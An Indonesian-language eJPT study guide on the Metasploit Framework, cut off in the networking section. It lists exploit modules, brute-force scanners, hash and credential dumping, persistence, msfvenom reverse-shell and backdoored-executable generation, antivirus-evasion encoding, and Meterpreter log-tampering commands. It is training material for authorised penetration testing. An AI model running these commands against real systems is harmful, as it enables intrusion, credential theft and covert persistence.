# 🔧 eJPT — The Metasploit Framework (MSF)
### Host & Network Penetration Testing

> **Disclaimer**: Seluruh materi ini hanya untuk tujuan **edukasi**, **sertifikasi**, dan **legal penetration testing** di lingkungan lab yang telah mendapat izin. Penggunaan teknik ini di luar konteks yang diizinkan adalah ilegal dan melanggar hukum.

---

## 📋 Daftar Isi

1. [Overview Metasploit Framework](#1-overview-metasploit-framework)
2. [Arsitektur & Struktur MSF](#2-arsitektur--struktur-msf)
3. [Instalasi & Setup](#3-instalasi--setup)
4. [MSFconsole — Interface Utama](#4-msfconsole--interface-utama)
   - [Navigasi Dasar](#41-navigasi-dasar)
   - [Manajemen Workspace](#42-manajemen-workspace)
   - [Database Integration](#43-database-integration)
5. [Module Types](#5-module-types)
   - [Auxiliary Modules](#51-auxiliary-modules)
   - [Exploit Modules](#52-exploit-modules)
   - [Post Modules](#53-post-modules)
   - [Payload Modules](#54-payload-modules)
   - [Encoder Modules](#55-encoder-modules)
   - [Evasion Modules](#56-evasion-modules)
6. [Payloads & Msfvenom](#6-payloads--msfvenom)
   - [Jenis Payload](#61-jenis-payload)
   - [Msfvenom Lengkap](#62-msfvenom-lengkap)
7. [Meterpreter](#7-meterpreter)
   - [Perintah Sistem](#71-perintah-sistem)
   - [File System](#72-file-system)
   - [Networking](#73-networking)
   - [Privilege Escalation](#74-privilege-escalation)
   - [Credential Harvesting](#75-credential-harvesting)
   - [Pivoting via Meterpreter](#76-pivoting-via-meterpreter)
8. [Scanning & Enumeration dengan MSF](#8-scanning--enumeration-dengan-msf)
9. [Exploitation Workflows](#9-exploitation-workflows)
   - [Windows Exploitation](#91-windows-exploitation)
   - [Linux Exploitation](#92-linux-exploitation)
10. [Post-Exploitation Modules](#10-post-exploitation-modules)
11. [MSF Automation & Scripting](#11-msf-automation--scripting)
12. [Cheat Sheet & Quick Reference](#12-cheat-sheet--quick-reference)

---

## 1. Overview Metasploit Framework

### Apa itu Metasploit Framework?

**Metasploit Framework (MSF)** adalah platform penetration testing open-source yang paling banyak digunakan di dunia. Dikembangkan oleh H.D. Moore pada tahun 2003 dan diakuisisi oleh Rapid7. MSF menyediakan ekosistem lengkap untuk seluruh fase penetration testing, mulai dari reconnaissance hingga post-exploitation.

### Kenapa Metasploit Penting untuk eJPT?

- Digunakan di **hampir semua fase** penetration testing
- Memiliki lebih dari **2.000 exploit modules** yang siap pakai
- Terintegrasi dengan tools lain (Nmap, Nessus, dll.)
- **Meterpreter** menyediakan post-exploitation yang sangat powerful
- Standar industri untuk sertifikasi keamanan siber

### Komponen Utama MSF

```
┌─────────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                         │
├─────────────────────────────────────────────────────────────────┤
│  Interfaces:  msfconsole │ msfdb │ Armitage (GUI)               │
├─────────────────────────────────────────────────────────────────┤
│  Modules:                                                       │
│  ┌──────────┐ ┌─────────┐ ┌──────┐ ┌────────┐ ┌─────────────┐ │
│  │Auxiliary │ │Exploits │ │Posts │ │Payloads│ │Encoders/NOP │ │
│  └──────────┘ └─────────┘ └──────┘ └────────┘ └─────────────┘ │
├─────────────────────────────────────────────────────────────────┤
│  Libraries:  Rex │ MSF Core │ MSF Base                          │
├─────────────────────────────────────────────────────────────────┤
│  Database:   PostgreSQL (workspace, hosts, services, vulns)     │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Arsitektur & Struktur MSF

### Struktur Direktori

```
/usr/share/metasploit-framework/
├── modules/
│   ├── auxiliary/          ← Scanner, fuzzer, brute force, dll.
│   │   ├── scanner/
│   │   │   ├── smb/
│   │   │   ├── ssh/
│   │   │   ├── http/
│   │   │   └── ...
│   │   ├── brute/
│   │   └── gather/
│   ├── exploits/           ← Exploit modules
│   │   ├── windows/
│   │   │   ├── smb/
│   │   │   ├── http/
│   │   │   └── ...
│   │   ├── linux/
│   │   ├── multi/
│   │   └── unix/
│   ├── post/               ← Post-exploitation modules
│   │   ├── windows/
│   │   │   ├── gather/
│   │   │   ├── manage/
│   │   │   └── escalate/
│   │   └── linux/
│   ├── payloads/           ← Payload definitions
│   │   ├── singles/
│   │   ├── stagers/
│   │   └── stages/
│   ├── encoders/           ← Payload encoders
│   └── nops/               ← NOP generators
├── scripts/
│   └── meterpreter/        ← Meterpreter scripts
├── tools/
└── data/
    └── wordlists/          ← Built-in wordlists
```

### Alur Kerja MSF

```
[Reconnaissance]
      ↓
[Scanning/Enumeration]  ← auxiliary/scanner/*
      ↓
[Vulnerability Identification]  ← nmap --script vuln
      ↓
[Exploitation]  ← exploit/* + payload/*
      ↓
[Meterpreter/Shell]
      ↓
[Post-Exploitation]  ← post/*
      ↓
[Privilege Escalation]
      ↓
[Persistence/Pivoting]
```

---

## 3. Instalasi & Setup

### Kali Linux (sudah pre-installed)

```bash
# Update Metasploit ke versi terbaru
apt-get update && apt-get upgrade metasploit-framework

# Cek versi
msfconsole --version

# Atau di dalam msfconsole
msf6> version
```

### Setup Database PostgreSQL

MSF menggunakan PostgreSQL untuk menyimpan data scan, host, services, dan credentials.

```bash
# Start PostgreSQL service
systemctl start postgresql
systemctl enable postgresql

# Inisialisasi database MSF
msfdb init

# Cek status database
msfdb status

# Start database (jika sudah pernah init)
msfdb start

# Stop database
msfdb stop

# Reset database (hapus semua data)
msfdb reinit

# Di dalam msfconsole, cek koneksi
msf6> db_status
# Output: [*] Connected to msf. Connection type: postgresql.
```

### Konfigurasi Awal

```bash
# Jalankan msfconsole
msfconsole

# Update semua modules
msf6> apt update        # dari terminal biasa

# Cek semua modules yang tersedia
msf6> show -h
```

---

## 4. MSFconsole — Interface Utama

### 4.1 Navigasi Dasar

```bash
# ─── HELP & INFO ────────────────────────────────────────────

help                        # tampilkan semua perintah
help search                 # bantuan untuk perintah search
?                           # sama seperti help
banner                      # tampilkan banner MSF

# ─── SEARCH MODULE ──────────────────────────────────────────

# Pencarian umum
search ms17-010
search eternalblue
search type:exploit smb

# Pencarian dengan filter
search type:exploit platform:windows
search type:auxiliary scanner smb
search type:post windows gather
search cve:2017-0144
search name:psexec
search rank:excellent

# Filter lanjutan
search type:exploit platform:linux rank:excellent
search author:hdm                    # cari berdasarkan author

# ─── GUNAKAN MODULE ─────────────────────────────────────────

use exploit/windows/smb/ms17_010_eternalblue
use 0                               # gunakan nomor dari hasil search
use auxiliary/scanner/smb/smb_ms17_010

# Info module
info                                # detail lengkap module aktif
info exploit/windows/smb/ms17_010_eternalblue
show info

# ─── OPSI MODULE ────────────────────────────────────────────

show options                        # tampilkan opsi yang bisa di-set
show advanced                       # opsi advanced
show evasion                        # opsi evasion
show payloads                       # payload yang kompatibel
show targets                        # target OS yang didukung
show missing                        # opsi wajib yang belum di-set

# ─── SET OPSI ───────────────────────────────────────────────

set RHOSTS 192.168.1.100
set RHOSTS 192.168.1.0/24           # bisa subnet
set RHOSTS file:/path/to/hosts.txt  # dari file
set RPORT 445
set LHOST 192.168.1.10
set LHOST tun0                      # bisa interface name
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set THREADS 10                      # jumlah thread (untuk scanner)
set VERBOSE true                    # output verbose

# Unset opsi
unset RHOSTS
unset all                           # unset semua opsi

# Set global (berlaku untuk semua module)
setg LHOST 192.168.1.10
setg LPORT 4444
unsetg LHOST                        # unset global

# ─── JALANKAN ───────────────────────────────────────────────

run                                 # jalankan module
exploit                             # sama seperti run (untuk exploit)
run -j                              # jalankan sebagai background job
exploit -j
check                               # cek apakah target rentan (jika didukung)

# ─── SESI MANAJEMEN ─────────────────────────────────────────

sessions                            # list semua sesi aktif
sessions -l                         # list sesi (verbose)
sessions -i 1                       # interaksi dengan sesi 1
sessions -k 1                       # kill sesi 1
sessions -k -1                      # kill semua sesi
sessions -u 1                       # upgrade shell ke meterpreter
sessions -C 'getuid' -i 1           # jalankan command di sesi tertentu

# Background sesi aktif
background
Ctrl+Z

# ─── JOBS ───────────────────────────────────────────────────

jobs                                # list background jobs
jobs -l                             # list jobs verbose
jobs -k 1                           # kill job
jobs -K                             # kill semua jobs

# ─── HISTORY & SHELL ────────────────────────────────────────

history                             # riwayat perintah
!ls                                 # jalankan perintah OS langsung
shell                               # masuk ke OS shell
exit                                # keluar dari shell/msfconsole

# ─── OUTPUT ─────────────────────────────────────────────────

spool /tmp/msf_output.txt           # simpan semua output ke file
spool off                           # matikan logging
save                                # simpan konfigurasi sesi
```

---

### 4.2 Manajemen Workspace

Workspace memungkinkan kita memisahkan data dari engagement yang berbeda.

```bash
# Lihat workspace saat ini
workspace
workspace -l                        # list semua workspace

# Buat workspace baru
workspace -a pentest_client1
workspace -a pentest_client2

# Pindah workspace
workspace pentest_client1

# Hapus workspace
workspace -d pentest_client1

# Rename workspace
workspace -r old_name new_name

# Reset workspace (hapus semua data di workspace aktif)
workspace -D

# Contoh workflow dengan workspace
workspace -a engagement_20240101
workspace engagement_20240101
# ... lakukan scanning dan exploitation ...
# Data tersimpan di workspace ini
```

---

### 4.3 Database Integration

```bash
# ─── HOST MANAGEMENT ────────────────────────────────────────

hosts                               # tampilkan semua host
hosts -c address,os_name,purpose    # kolom spesifik
hosts -S windows                    # filter berdasarkan OS
hosts -a 192.168.1.100             # tambah host manual
hosts -d 192.168.1.100             # hapus host

# ─── SERVICE MANAGEMENT ────────────────────────────────────

services                            # tampilkan semua service
services -p 445                     # filter berdasarkan port
services -s smb                     # filter berdasarkan nama
services -S open                    # hanya port yang open
services -c name,port,state         # kolom spesifik

# ─── VULNERABILITY MANAGEMENT ──────────────────────────────

vulns                               # tampilkan kerentanan yang ditemukan
vulns -p 445                        # filter berdasarkan port

# ─── CREDENTIAL MANAGEMENT ─────────────────────────────────

creds                               # tampilkan semua credentials
creds -u admin                      # filter berdasarkan username
creds -s smb                        # filter berdasarkan service
creds add user:admin password:pass123 realm:WORKGROUP  # tambah manual

# ─── LOOT MANAGEMENT ───────────────────────────────────────

loot                                # tampilkan semua data yang dikumpulkan
loot -t hash                        # filter berdasarkan tipe

# ─── IMPORT/EXPORT ─────────────────────────────────────────

# Import hasil scan Nmap
db_nmap -sV -sC -O 192.168.1.0/24
db_nmap -A --top-ports 1000 192.168.1.100    # nmap via MSF (disimpan ke DB)

# Import file XML Nmap
db_import /path/to/nmap_scan.xml

# Import file Nessus
db_import /path/to/nessus_scan.nessus

# Export data
db_export -f xml /tmp/msf_export.xml

# ─── QUERY LANGSUNG ─────────────────────────────────────────

# Gunakan RHOSTS dari data database
hosts -R                            # set RHOSTS dari semua host di DB
services -p 445 -R                  # set RHOSTS dari host yang punya port 445
```

---

## 5. Module Types

### 5.1 Auxiliary Modules

Auxiliary modules digunakan untuk scanning, enumeration, brute force, dan berbagai tugas non-exploit lainnya.

```bash
# ─── SCANNER ────────────────────────────────────────────────

# Port Scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 50
run

# SYN Scanner (butuh root)
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 80,443,22,445
run

# UDP Scanner
use auxiliary/scanner/portscan/udp
set RHOSTS TARGET_IP
run

# ─── SMB SCANNERS ───────────────────────────────────────────

# SMB Version Detection
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SMB Shares Enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS TARGET_IP
run

# SMB Users Enumeration
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS TARGET_IP
run

# SMB Vulnerability Check (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# SMB Login Brute Force
use auxiliary/scanner/smb/smb_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

# ─── SSH SCANNERS ───────────────────────────────────────────

# SSH Version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SSH Login Brute Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE false
run

# SSH Key Login (dengan private keys)
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS TARGET_IP
set USERNAME root
set KEY_FILE /path/to/id_rsa
run

# ─── HTTP SCANNERS ──────────────────────────────────────────

# HTTP Version
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# HTTP Directory Enum
use auxiliary/scanner/http/dir_scanner
set RHOSTS TARGET_IP
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# HTTP File Enum
use auxiliary/scanner/http/files_dir
set RHOSTS TARGET_IP
run

# HTTP Login Brute Force
use auxiliary/scanner/http/http_login
set RHOSTS TARGET_IP
set AUTH_URI /admin/login
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Robots.txt Scanner
use auxiliary/scanner/http/robots_txt
set RHOSTS 192.168.1.0/24
run

# ─── FTP SCANNERS ───────────────────────────────────────────

# FTP Version
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

# FTP Anonymous Login
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# FTP Login Brute Force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# ─── SNMP SCANNERS ──────────────────────────────────────────

# SNMP Community Brute
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
run

# SNMP Enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS TARGET_IP
set COMMUNITY public
run

# ─── MYSQL SCANNERS ────────────────────────────────────────

# MySQL Version
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.0/24
run

# MySQL Login
use auxiliary/scanner/mysql/mysql_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# ─── RDP SCANNER ────────────────────────────────────────────

use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.0/24
run

# ─── WINRM SCANNER ──────────────────────────────────────────

use auxiliary/scanner/winrm/winrm_login
set RHOSTS TARGET_IP
set USERNAME administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

### 5.2 Exploit Modules

```bash
# ─── WINDOWS EXPLOITS ───────────────────────────────────────

# EternalBlue - MS17-010 (Windows 7, Server 2008)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# MS08-067 (Windows XP, Server 2003)
use exploit/windows/smb/ms08_067_netapi
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run

# PsExec via SMB (credential-based)
use exploit/windows/smb/psexec
set RHOSTS TARGET_IP
set SMBUser administrator
set SMBPass Password123
set LHOST ATTACKER_IP
run

# WebDAV IIS Upload
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS TARGET_IP
set TARGETURI /webdav/
set HttpUsername admin
set HttpPassword admin123
set LHOST ATTACKER_IP
run

# BlueKeep - CVE-2019-0708 (RDP)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run

# HTA Web Server (social engineering)
use exploit/windows/misc/hta_server
set LHOST ATTACKER_IP
set LPORT 8080
run
# Kirim URL ke target: http://ATTACKER_IP:8080/payload.hta

# ─── LINUX EXPLOITS ────────────────────────────────────────

# Shellshock (Apache CGI)
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS TARGET_IP
set TARGETURI /cgi-bin/vulnerable.cgi
set LHOST ATTACKER_IP
run

# vsFTPd 2.3.4 Backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
run

# Samba usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run

# Distcc Daemon Command Execution
use exploit/unix/misc/distcc_exec
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run

# ─── MULTI-PLATFORM EXPLOITS ────────────────────────────────

# Java RMI Server (multi-platform)
use exploit/multi/misc/java_rmi_server
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run

# Apache Tomcat Manager (upload WAR)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET_IP
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST ATTACKER_IP
run

# Multi Handler (listener untuk reverse shell)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j
```

---

### 5.3 Post Modules

```bash
# ─── GATHER ─────────────────────────────────────────────────

# Dump hash Windows
use post/windows/gather/hashdump
set SESSION 1
run

# Dump credentials
use post/windows/gather/credentials/credential_collector
set SESSION 1
run

# Enum logged-on users
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

# Enum installed applications
use post/windows/gather/enum_applications
set SESSION 1
run

# Enum shares
use post/windows/gather/enum_shares
set SESSION 1
run

# Enum system info
use post/windows/gather/enum_system
set SESSION 1
run

# Enum patches/hotfixes
use post/windows/gather/enum_patches
set SESSION 1
run

# Linux gather
use post/linux/gather/hashdump
set SESSION 1
run

use post/linux/gather/enum_configs
set SESSION 1
run

use post/linux/gather/enum_network
set SESSION 1
run

# ─── ESCALATE ───────────────────────────────────────────────

# Suggest local exploits
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Windows token impersonation
use post/windows/escalate/getsystem
set SESSION 1
run

# ─── MANAGE ─────────────────────────────────────────────────

# Add route untuk pivoting
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.2.0
set NETMASK 255.255.255.0
run

# Shell ke meterpreter upgrade
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

# Ping sweep internal network
use post/multi/gather/ping_sweep
set RHOSTS 192.168.2.0/24
set SESSION 1
run

# ─── PERSISTENCE ────────────────────────────────────────────

# Windows persistence via registry
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP REGISTRY
run

# Windows persistence via scheduled task
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SCHEDULER
run
```

---

### 5.4 Payload Modules

#### Konsep Staged vs Stageless

```
STAGED PAYLOAD (pakai "/" di tengah):
  windows/meterpreter/reverse_tcp
  ├── Stager: kecil (~300 bytes), kirim ke target dulu
  └── Stage: meterpreter penuh, di-download setelah stager jalan
  + Cocok untuk: exploit dengan buffer kecil
  + Butuh koneksi ke MSF untuk download stage

STAGELESS PAYLOAD (pakai "_" di tengah):
  windows/meterpreter_reverse_tcp
  ├── Semua sudah include dalam satu file
  + Cocok untuk: standalone exe, tidak butuh MSF saat delivery
  + Ukuran lebih besar
  + Tidak butuh download stage
```

```bash
# Lihat semua payload
show payloads

# Payload Windows paling umum
windows/meterpreter/reverse_tcp         # staged, x86
windows/x64/meterpreter/reverse_tcp     # staged, x64
windows/meterpreter/reverse_https       # staged, HTTPS (lebih stealthy)
windows/x64/meterpreter/reverse_https
windows/meterpreter_reverse_tcp         # stageless, x86
windows/shell_reverse_tcp               # simple shell, bukan meterpreter
windows/x64/shell_reverse_tcp

# Payload Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x86/meterpreter_reverse_tcp       # stageless
linux/x86/shell_reverse_tcp

# Payload multi-platform
java/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
ruby/shell_reverse_tcp

# Bind payload (target membuka port, kita yang connect)
windows/meterpreter/bind_tcp
linux/x86/meterpreter/bind_tcp
```

---

### 5.5 Encoder Modules

Encoder digunakan untuk meng-encode payload agar menghindari deteksi.

```bash
# Lihat semua encoder
show encoders

# Encoder populer:
# x86/shikata_ga_nai    - polymorphic XOR additive feedback, rank: excellent
# x64/xor               - XOR, rank: normal
# x86/xor_dynamic       - dynamic key XOR
# cmd/powershell_base64  - base64 encode untuk PowerShell

# Gunakan encoder di msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded.exe

# Multiple iterasi = lebih sulit dideteksi (diminishing returns setelah ~10x)
```

---

### 5.6 Evasion Modules

```bash
# Lihat evasion modules
use evasion/
show evasion

# Windows Defender Evasion
use evasion/windows/applocker_evasion_install_util
use evasion/windows/windows_defender_exe

# Set opsi dan generate
set FILENAME payload.exe
run
```

---

## 6. Payloads & Msfvenom

### 6.1 Jenis Payload

| Tipe | Format | Deskripsi |
|---|---|---|
| Reverse TCP | `windows/meterpreter/reverse_tcp` | Target connect ke attacker |
| Reverse HTTPS | `windows/meterpreter/reverse_https` | Reverse via HTTPS (stealthy) |
| Bind TCP | `windows/meterpreter/bind_tcp` | Attacker connect ke target |
| Reverse HTTP | `windows/meterpreter/reverse_http` | Reverse via HTTP |

### 6.2 Msfvenom Lengkap

Msfvenom menggabungkan msfpayload dan msfencode menjadi satu tool.

```bash
# ─── OPSI DASAR ─────────────────────────────────────────────

msfvenom --help
msfvenom -l payloads                 # list semua payload
msfvenom -l formats                  # list semua format output
msfvenom -l encoders                 # list semua encoder
msfvenom -l platforms                # list semua platform

# Syntax dasar
msfvenom -p PAYLOAD [OPTIONS] -f FORMAT -o OUTPUT_FILE

# ─── WINDOWS PAYLOADS ───────────────────────────────────────

# EXE 32-bit
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f exe -o win32_shell.exe

# EXE 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f exe -o win64_shell.exe

# EXE stageless (tidak butuh koneksi ke MSF saat delivery)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f exe -o stageless.exe

# DLL (untuk DLL injection / hijacking)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f dll -o malicious.dll

# PowerShell Script
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f psh-reflection -o shell.ps1

# PowerShell (encoded base64)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f psh-cmd -o shell_encoded.bat

# HTA (HTML Application - social engineering)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f hta-psh -o payload.hta

# VBA Macro (untuk Office documents)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f vba -o macro.vba

# MSI Installer (untuk AlwaysInstallElevated PrivEsc)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f msi -o installer.msi

# ─── LINUX PAYLOADS ─────────────────────────────────────────

# ELF Binary 32-bit
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f elf -o linux32_shell.elf

# ELF Binary 64-bit
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f elf -o linux64_shell.elf

# ELF stageless
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f elf -o stageless_linux.elf

# ─── WEB SHELL PAYLOADS ─────────────────────────────────────

# PHP
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shell.php

# ASP (IIS)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f asp -o shell.asp

# ASPX (IIS .NET)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f aspx -o shell.aspx

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shell.jsp

# WAR (Tomcat deployment)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f war -o shell.war

# ─── ENCODING ───────────────────────────────────────────────

# Encode payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded.exe

# Bad character avoidance (misal exploit tidak boleh ada 0x00, 0x0a)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f raw -o shellcode.bin

# ─── FORMAT LAINNYA ─────────────────────────────────────────

# Raw shellcode (untuk dimasukkan ke exploit manual)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f raw -o shellcode.bin

# C format (untuk embed di program C)
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f c

# Python format
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -f python

# ─── TIPS ───────────────────────────────────────────────────

# Inject ke executable yang sudah ada (backdoor)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -x /path/to/original.exe \
  -f exe -o backdoored.exe

# Keep original functionality (tambahkan -k)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 \
  -x /path/to/original.exe -k \
  -f exe -o backdoored.exe
```

### Setup Handler (Listener)

Selalu jalankan handler sebelum mengirimkan payload ke target.

```bash
# Cara paling efisien - jalankan sebagai background job
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0          # listen di semua interface
set LPORT 4444
set ExitOnSession false     # jangan berhenti setelah dapat sesi pertama
run -j                      # jalankan sebagai job

# Verifikasi handler berjalan
jobs

# Ketika payload dieksekusi di target, sesi akan muncul
# Check dengan:
sessions
```

---

## 7. Meterpreter

### Apa itu Meterpreter?

**Meterpreter** (Meta-Interpreter) adalah advanced payload yang berjalan **sepenuhnya di memory** (tidak menulis ke disk) dan menggunakan **encrypted communications**. Ini menjadikannya sangat sulit dideteksi oleh antivirus dan forensik tools.

**Fitur Utama:**
- Berjalan di memory, tidak ada file di disk
- Komunikasi terenkripsi (TLS)
- Extensible via scripts dan plugins
- Cross-platform (Windows, Linux, macOS)
- Dapat di-migrate ke proses lain

### 7.1 Perintah Sistem

```bash
# ─── INFO DASAR ─────────────────────────────────────────────

sysinfo                     # info OS, hostname, arsitektur, domain
getuid                      # user yang menjalankan meterpreter
getpid                      # PID proses meterpreter saat ini
getenv PATH                 # nilai environment variable

# ─── PROSES ─────────────────────────────────────────────────

ps                          # list semua proses
ps -S svchost               # filter berdasarkan nama proses
kill 1234                   # kill proses berdasarkan PID

# Migrasi ke proses lain (lebih stabil / persistent)
migrate 1234                # migrate ke PID spesifik
migrate -N explorer.exe     # migrate ke proses berdasarkan nama
# Tips: migrate ke proses yang dimiliki user target, bukan SYSTEM
# Migrasi ke svchost.exe atau explorer.exe untuk stabilitas

# ─── PRIVILEGE ──────────────────────────────────────────────

getsystem                   # coba berbagai teknik PrivEsc ke SYSTEM
getsystem -t 1              # teknik Named Pipe Impersonation
getsystem -t 2              # teknik Token Duplication
getsystem -t 3              # teknik Local Service

getprivs                    # tampilkan semua privileges token saat ini

# ─── SHELL ──────────────────────────────────────────────────

shell                       # masuk ke OS shell (cmd.exe / bash)
# Ctrl+Z untuk kembali ke meterpreter

# Jalankan command langsung
execute -f cmd.exe -a "/c whoami"
execute -f cmd.exe -a "/c net user hacker P@ss1234 /add"
execute -H -f notepad.exe   # -H = hidden

# ─── TIMESTAMP MANIPULATION ─────────────────────────────────

timestomp file.exe -z        # set semua timestamp ke null
timestomp file.exe -m "01/01/2020 00:00:00"  # set modified time
```

---

### 7.2 File System

```bash
# ─── NAVIGASI ───────────────────────────────────────────────

pwd                         # direktori saat ini
ls                          # list file
ls -la                      # list detail
cd C:\\Users\\admin         # pindah direktori
cd /home/user               # Linux

# ─── FILE OPERATIONS ────────────────────────────────────────

cat file.txt                # tampilkan isi file
edit file.txt               # edit file di text editor
rm file.txt                 # hapus file
mkdir NewFolder             # buat direktori
rmdir OldFolder             # hapus direktori

# ─── TRANSFER FILE ──────────────────────────────────────────

# Upload dari attacker ke target
upload /path/to/local/file.exe C:\\Users\\admin\\file.exe
upload /path/to/winpeas.exe C:\\Temp\\wp.exe

# Download dari target ke attacker
download C:\\Users\\admin\\passwords.txt /tmp/
download C:\\Windows\\System32\\config\\SAM /tmp/SAM
download C:\\Windows\\System32\\config\\SYSTEM /tmp/SYSTEM

# ─── PENCARIAN FILE ─────────────────────────────────────────

search -f password*.txt                     # cari berdasarkan nama
search -f *.config -d C:\\inetpub           # cari di direktori spesifik
search -f id_rsa -d /home                   # cari SSH keys
search -f web.config -d C:\\inetpub\\wwwroot

# ─── CHECKSUM ───────────────────────────────────────────────

checksum md5 file.exe
checksum sha1 file.exe
```

---

### 7.3 Networking

```bash
# ─── INFO JARINGAN ──────────────────────────────────────────

ifconfig                    # interface dan IP address
ipconfig                    # Windows
route                       # routing table
arp                         # ARP table (host yang pernah komunikasi)

# ─── PORT FORWARDING ────────────────────────────────────────

# Forward local port ke target
